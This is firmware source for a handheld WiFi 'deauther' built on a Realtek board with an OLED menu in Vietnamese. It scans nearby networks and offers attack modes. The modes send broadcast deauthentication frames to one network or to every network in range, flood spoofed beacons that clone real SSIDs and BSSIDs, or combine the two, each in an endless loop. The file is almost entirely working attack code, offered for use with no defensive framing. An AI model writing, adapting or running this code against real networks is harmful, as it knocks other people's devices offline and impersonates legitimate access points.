#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

#undef max
#undef min
#include <SPI.h>
#define SPI_MODE0 0x00
#include "vector"
#include "map"
#include "debug.h"
#include <Wire.h>

#include <Adafruit_GFX.h>
#include "FontMaker.h"
#include <Adafruit_SSD1306.h>
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

#define BTN_DOWN PA27
#define BTN_UP PA12
#define BTN_OK PA13
#define BLACK 0x0000

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];

  short rssi;
  uint channel;
} WiFiScanResult;

char *ssid = "";
char *pass = "";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;
String SelectedSSID;
String SSIDCh;

int attackstate = 0;
int menustate = 0;
bool menuscroll = true;
bool okstate = true;
int scrollindex = 0;
int perdeauth = 3;

unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;

#define SCROLL_INTERVAL 800
const int maxSSIDChars = 16;

unsigned long lastScrollTime = 0;
int scrollOffset = 0;
int currentSelectedIndex = -1;

int scrollindexx = 0;

static const unsigned char PROGMEM image_download_bits[] = { 0x01, 0xf0, 0x00, 0x07, 0xfc, 0x00, 0x1e, 0x0f, 0x00, 0x39, 0xf3, 0x80, 0x77, 0xfd, 0xc0, 0xef, 0x1e, 0xe0, 0x5c, 0xe7, 0x40, 0x3b, 0xfb, 0x80, 0x17, 0x1d, 0x00, 0x0e, 0xee, 0x00, 0x05, 0xf4, 0x00, 0x03, 0xb8, 0x00, 0x01, 0x50, 0x00, 0x00, 0xe0, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00 };
static const unsigned char PROGMEM image_download_1_bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };

void setpx(int16_t x, int16_t y, uint16_t color) {
  display.drawPixel(x, y, color);
}
MakeFont myfont(&setpx);

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
void selectedmenu(String text) {
  display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
  display.println(text);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi Networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" Done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" Failed!\n");
    return 1;
  }
}

void Single() {
  display.clearDisplay();
  myfont.set_font(MakeFont_Font1);
  myfont.print(5, 15, "Đang tấn công . . .", SSD1306_WHITE, BLACK);
  display.display();
  while (true) {
    memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    deauth_reason = 1;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 4;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 16;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
  }
}

void All() {
  display.clearDisplay();
  myfont.set_font(MakeFont_Font1);
  myfont.print(5, 15, "Đang tấn công tất cả . . .", SSD1306_WHITE, BLACK);
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < perdeauth; x++) {
        deauth_reason = 1;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 4;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 16;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      }
    }
  }
}
void BecaonDeauth() {
  display.clearDisplay();
  myfont.set_font(MakeFont_Font1);
  myfont.print(5, 15, "Wifi giả và tấn công . . .", SSD1306_WHITE, BLACK);
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      String ssid1 = scan_results[i].ssid;
      const char *ssid1_cstr = ssid1.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 0);
      }
    }
  }
}
void Becaon() {
  display.clearDisplay();
  myfont.set_font(MakeFont_Font1);
  myfont.print(5, 15, "Tấn công Wifi giả. . .", SSD1306_WHITE, BLACK);
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      String ssid1 = scan_results[i].ssid;
      const char *ssid1_cstr = ssid1.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
      }
    }
  }
}

void drawProgressBar(int x, int y, int width, int height, int progress) {
  display.drawRoundRect(x, y, width, height, 2, WHITE);
  int innerWidth = (width - 2) * progress / 100;
  if (innerWidth > 0) {
    display.fillRoundRect(x + 1, y + 1, innerWidth, height - 2, 2, WHITE);
  }
}

void drawMenuItem(int y, const char *text, bool selected) {
  myfont.set_font(MakeFont_Font1);
  if (selected) {
    display.fillRect(8, y, SCREEN_WIDTH - 12, 14, WHITE);
    myfont.print(10, y, text, BLACK, WHITE);
  } else {
    myfont.print(10, y, text, WHITE, BLACK);
  }
}

void drawStatusBar(const char *status, int x, int y) {
  myfont.set_font(MakeFont_Font1);
  display.fillRect(0, 0, SCREEN_WIDTH, 12, WHITE);
  myfont.print(x, y, status, BLACK, WHITE);
}

void drawMainMenu(int selectedIndex) {
  display.clearDisplay();
  drawStatusBar("Màn Hình Chính", 25, 0);

  const char *menuItems[] = { "Tấn công", "Quét mạng", "Chọn mạng" };
  for (int i = 0; i < 3; i++) {
    drawMenuItem(16 + (i * 14), menuItems[i], i == selectedIndex);
  }
  display.display();
}

void drawScanScreen() {
  display.clearDisplay();
  display.fillRect(0, 0, SCREEN_WIDTH, 14, WHITE);
  myfont.set_font(MakeFont_Font1);
  myfont.print(37, 0, "Quét mạng", BLACK, SSD1306_WHITE);

  int totalTime = 5000;
  int steps = 50;
  int delayPerStep = totalTime / steps;

  for (int i = 0; i <= steps; i++) {
    myfont.set_font(MakeFont_Font1);
    myfont.print(10, 20, "Đang quét mạng. . .", SSD1306_WHITE, BLACK);
    int progress = (i * 100) / steps;
    drawProgressBar(20, 45, SCREEN_WIDTH - 40, 6, progress);
    display.display();
    delay(delayPerStep);
  }
}

void drawNetworkList(const String &selectedSSID, const String &channelType, int scrollIndex) {
  display.clearDisplay();
  drawStatusBar("NETWORKS", 34, 1);

  display.setTextSize(1);
  display.drawRect(6, 12, SCREEN_WIDTH - 12, 20, WHITE);
  
  display.setCursor(8, 16);
  display.print("SSID: ");

  String displaySSID = selectedSSID.length() > 12 ? selectedSSID.substring(0, 9) + "..." : selectedSSID;
  display.print(displaySSID);

  display.drawRect(8, 30, 28, 10, WHITE);
  display.setCursor(10, 32);
  display.print(channelType);

  if (scrollIndex > 0) {
    display.fillTriangle(SCREEN_WIDTH - 14, 16, SCREEN_WIDTH - 8, 10, SCREEN_WIDTH - 2, 16, WHITE);
  }
  if (true) {
    display.fillTriangle(SCREEN_WIDTH - 14, 36, SCREEN_WIDTH - 8, 42, SCREEN_WIDTH - 2, 36, WHITE);
  }

  display.display();
}

void drawAttackScreen(int attackType) {
  display.clearDisplay();

  // Warning banner
  display.fillRect(0, 0, SCREEN_WIDTH, 14, WHITE);
  myfont.set_font(MakeFont_Font1);
  myfont.print(30, 0, "Đang tấn công", BLACK, SSD1306_WHITE);

  // Attack type indicator
  const char *attackTypes[] = {
    "Tấn công",
    "Tấn công tất cả",
    "BEACON",
    "BEACON+Tấn công"
  };

  if (attackType >= 0 && attackType < 4) {
    myfont.set_font(MakeFont_Font1);
    myfont.print(10, 34, attackTypes[attackType], SSD1306_WHITE, BLACK);
  }

  // Animated attack indicator
  static const char patterns[] = { '.', 'o', 'O', 'o' };
  for (int i = 0; i < sizeof(patterns); i++) {
    myfont.set_font(MakeFont_Font1);
    myfont.print(10, 20, "Đang diễn ra :", SSD1306_WHITE, BLACK);
    display.display();
    delay(200);
  }
}

void titleScreen(void) {
  display.clearDisplay();
  display.setTextWrap(false);
  display.setTextColor(WHITE);
  display.setTextSize(3);
  display.setTextWrap(false);
  display.setCursor(20, 11);
  display.print("N_H_N");
  display.drawBitmap(54, 42, image_download_bits, 19, 16, 1);
  display.drawBitmap(97, 42, image_download_1_bits, 19, 16, 1);
  display.drawBitmap(12, 42, image_download_1_bits, 19, 16, 1);
  display.display();
}

void attackLoop() {
  int attackState = 0;
  int menuOffset = 0;  
  bool running = true;

  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    display.clearDisplay();
    drawStatusBar("Tấn công", 35, 0);

    const char *attackTypes[] = { "Tấn công", "Tấn công tất cả", "Beacon", "Beacon+Tấn công", "Quay lại" };
    int totalItems = sizeof(attackTypes) / sizeof(attackTypes[0]);

    if (attackState < menuOffset) menuOffset = attackState;
    if (attackState >= menuOffset + 3) menuOffset = attackState - 2;

    for (int i = 0; i < 4 && (menuOffset + i) < totalItems; i++) {
      drawMenuItem(16 + (i * 14), attackTypes[menuOffset + i], (menuOffset + i) == attackState);
    }

    display.display();

    if (digitalRead(BTN_OK) == LOW) {
      delay(150);
      if (attackState == totalItems - 1) { 
        running = false;
      } else {
        drawAttackScreen(attackState);
        switch (attackState) {
          case 0:
            Single();
            break;
          case 1:
            All();
            break;
          case 2:
            Becaon();
            break;
          case 3:
            BecaonDeauth();
            break;
        }
      }
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (attackState > 0) attackState--;
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (attackState < totalItems - 1) attackState++;
    }
  }
}

void networkSelectionLoop() {
  bool running = true;
  int menuOffset = 0; 
  int totalNetworks = (int)scan_results.size();

  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    unsigned long now = millis();
    display.clearDisplay();
    display.fillRect(0, 0, SCREEN_WIDTH, 14, WHITE);
    myfont.set_font(MakeFont_Font1);
    myfont.print(35,0,"Chọn mạng",BLACK,SSD1306_WHITE);

    if (scrollindexx < menuOffset) menuOffset = scrollindexx;
    if (scrollindexx >= menuOffset + 4) menuOffset = scrollindexx - 3;

    for (int i = 0; i < 4 && (menuOffset + i) < totalNetworks; i++) {
      int index = menuOffset + i;
      bool isSelected = (index == scrollindexx);

      String ssid = scan_results[index].ssid;
      String band = (scan_results[index].channel >= 36) ? "5G" : "2.4G";

      String displaySSID;
      if (isSelected && ssid.length() > maxSSIDChars) {
        if (currentSelectedIndex != scrollindexx) {
          currentSelectedIndex = scrollindexx;
          scrollOffset = 0;
          lastScrollTime = now;
        }
        if (now - lastScrollTime >= SCROLL_INTERVAL) {
          scrollOffset++;
          if (scrollOffset > ssid.length() - maxSSIDChars) {
            scrollOffset = 0;
          }
          lastScrollTime = now;
        }
        displaySSID = ssid.substring(scrollOffset, scrollOffset + maxSSIDChars);
      } else {
        scrollOffset = 0;
        if (ssid.length() > maxSSIDChars)
          displaySSID = ssid.substring(0, maxSSIDChars);
        else
          displaySSID = ssid;
      }
      myfont.set_font(MakeFont_Font1);
      if (isSelected) {
        myfont.print(4,12 + i * 10,displaySSID,BLACK,WHITE);
      } else {
        myfont.print(4,12 + i * 10,displaySSID,WHITE,BLACK);
      }

      myfont.set_font(MakeFont_Font1);
      myfont.print(108,12 + i * 10,band,SSD1306_WHITE,BLACK);
    }
    display.display();

    if (digitalRead(BTN_OK) == LOW) {
      delay(150);
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      running = false;
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (scrollindexx > 0) {
        scrollindexx--;
        updateSelectedNetwork();
        currentSelectedIndex = scrollindexx; 
        scrollOffset = 0;
        lastScrollTime = now;
      }
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (scrollindexx < totalNetworks - 1) {
        scrollindexx++;
        updateSelectedNetwork();
        currentSelectedIndex = scrollindexx; 
        scrollOffset = 0;
        lastScrollTime = now;
      }
    }

    delay(50);
  }

  updateSelectedNetwork();
}

void updateSelectedNetwork() {
  SelectedSSID = scan_results[scrollindexx].ssid;
  SSIDCh = (scan_results[scrollindexx].channel >= 36) ? "5G" : "2.4G";
}

void setup() {
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  Serial.begin(115200);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true)
      ;
  }
  titleScreen();
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks() != 0) {
    while (true) delay(1000);
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif
  SelectedSSID = scan_results[0].ssid;
  SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
}

void loop() {
  unsigned long currentTime = millis();

  drawMainMenu(menustate);

  if (digitalRead(BTN_OK) == LOW) {
    if (currentTime - lastOkTime > DEBOUNCE_DELAY) {
      if (okstate) {
        switch (menustate) {
          case 0: 
            display.clearDisplay();
            attackLoop();
            break;

          case 1:  
            display.clearDisplay();
            drawScanScreen();
            if (scanNetworks() == 0) {
              drawStatusBar("Đã quét xong", 30, 0);
              display.display();
              delay(1000);
            }
            break;

          case 2: 
            networkSelectionLoop();
            break;
        }
      }
      lastOkTime = currentTime;
    }
  }

  if (digitalRead(BTN_DOWN) == LOW) {
    if (currentTime - lastDownTime > DEBOUNCE_DELAY) {
      if (menustate > 0) {
        menustate--;
        display.invertDisplay(true);
        delay(50);
        display.invertDisplay(false);
      }
      lastDownTime = currentTime;
    }
  }

  if (digitalRead(BTN_UP) == LOW) {
    if (currentTime - lastUpTime > DEBOUNCE_DELAY) {
      if (menustate < 2) {
        menustate++;
        display.invertDisplay(true);
        delay(50);
        display.invertDisplay(false);
      }
      lastUpTime = currentTime;
    }
  }
}
